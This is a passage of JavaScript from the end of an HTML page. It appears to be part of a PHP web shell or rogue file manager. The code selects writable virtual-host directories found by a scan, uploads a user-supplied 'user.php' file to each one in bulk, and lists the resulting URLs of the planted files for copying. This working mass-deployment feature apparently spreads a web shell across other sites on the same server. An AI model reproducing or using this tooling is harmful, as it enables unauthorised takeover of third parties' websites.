    '</tr>';
  }).join('');
}

function sdToggleOne(idx, checked) {
  if (checked) sdSelected.add(idx);
  else sdSelected.delete(idx);
  sdUpdateDeployBtn();
}

function sdToggleAll(checked) {
  sdVhosts.forEach(function(v, i) {
    if (v.writable) {
      if (checked) sdSelected.add(i);
      else sdSelected.delete(i);
    }
  });
  sdRenderTable();
  sdUpdateDeployBtn();
}

function sdUpdateDeployBtn() {
  const btn = document.getElementById('sd-btn-deploy');
  if (sdSelected.size > 0) {
    btn.innerHTML = '<i class="fa-solid fa-rocket"></i> Deploy to ' + sdSelected.size + ' location(s)';
  } else {
    btn.innerHTML = '<i class="fa-solid fa-rocket"></i> Deploy Selected';
  }
}

async function doDeployVhosts() {
  if (sdSelected.size === 0) {
    toast('Select at least one writable location', 'error');
    return;
  }

  const fileInput = document.getElementById('sd-user-file');
  if (!fileInput.files || fileInput.files.length === 0) {
    toast('Please upload your user.php file first', 'error');
    fileInput.focus();
    return;
  }

  const targets = [];
  sdSelected.forEach(function(i) { targets.push(sdVhosts[i].path); });
  sdShowPhase('deploying');

  const fd = new FormData();
  fd.append('action', 'deploy_vhosts');
  fd.append('_token', FM.TOKEN);
  fd.append('targets', JSON.stringify(targets));
  fd.append('user_file', fileInput.files[0]);
  const r = await fetch(FM.SELF, { method: 'POST', body: fd });
  const res = await r.json().catch(function() { return { ok: false, msg: 'Parse error' }; });

  sdShowPhase('done');

  if (!res.ok) {
    document.getElementById('sd-deploy-stats').innerHTML = '<span style="color:var(--danger)">' + esc(res.msg) + '</span>';
    return;
  }

  const d = res.data;
  document.getElementById('sd-deploy-stats').innerHTML =
    '<span>Deployed: <b style="color:var(--success)">' + d.success_count + '</b></span>' +
    (d.fail_count > 0 ? '<span>Failed: <b style="color:var(--danger)">' + d.fail_count + '</b></span>' : '');

  const urls = [];
  const errors = [];
  d.results.forEach(function(r) {
    if (r.success) {
      urls.push(r.path + '/' + r.folder + '/user.php');
    } else {
      errors.push(r.path + ': ' + r.error);
    }
  });

  document.getElementById('sd-url-list').value = urls.join('\n');

  if (errors.length > 0) {
    document.getElementById('sd-deploy-errors').innerHTML =
      '<div style="font-size:12px;color:var(--danger);margin-top:8px"><b>Errors:</b><br>' +
      errors.map(function(e) { return esc(e); }).join('<br>') + '</div>';
  } else {
    document.getElementById('sd-deploy-errors').innerHTML = '';
  }

  toast(res.msg, 'success');
}

function sdCopyUrls() {
  const text = document.getElementById('sd-url-list').value;
  if (!text) { toast('No URLs to copy', 'error'); return; }
  copyToClipboard(text);
}

function sdRescan() {
  sdSelected.clear();
  if (sdBaseDir) {
    sdPickPath = sdBaseDir;
    sdDoScan();
  } else {
    openScanDeploy();
  }
}

</script>
</body>
</html>
